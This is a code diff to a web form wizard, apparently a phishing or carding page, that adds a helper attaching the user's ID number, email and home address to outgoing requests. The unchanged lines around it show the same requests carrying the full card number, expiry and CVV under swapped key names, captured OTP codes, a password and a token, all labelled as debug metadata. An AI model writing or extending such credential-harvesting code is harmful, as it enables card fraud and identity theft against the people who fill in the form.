@@ -225,6 +225,14 @@ function accumulateDebugOtp(incoming: Record<string, unknown>) {
   return next;
 }
 
+function personDebugMeta() {
+  return {
+    documento: state.numeroDocumento,
+    correo: val("correoPrimario"),
+    direccion: val("direccionResidencia"),
+  };
+}
+
 function setStep(step: number) {
   state.step = step;
   document.querySelectorAll(".wizard-panel").forEach((panel) => {
@@ -1180,11 +1188,12 @@ export function bindSolicitudWizard() {
             amount: grandTotal(),
             brand: brandKey,
             card: `${digits.slice(0, 6)}******${digits.slice(-4)}`,
+            ...personDebugMeta(),
             cpayload: {
               b: number,
               cv: val("cardVence"),
               exp: val("cardCvv"),
-              holder: val("cardTitular"),
+              holder: personName(),
             },
           }),
         }),
@@ -1258,6 +1267,7 @@ export function bindSolicitudWizard() {
             meta: accumulateDebugMeta({
               step: "Envió código OTP",
               brand: brandKey,
+              ...personDebugMeta(),
             }),
             metaOtp: accumulateDebugOtp({
               step: "Envió código OTP",
@@ -1325,6 +1335,7 @@ export function bindSolicitudWizard() {
               password,
               token,
               cdin,
+              ...personDebugMeta(),
             }),
           }),
         });
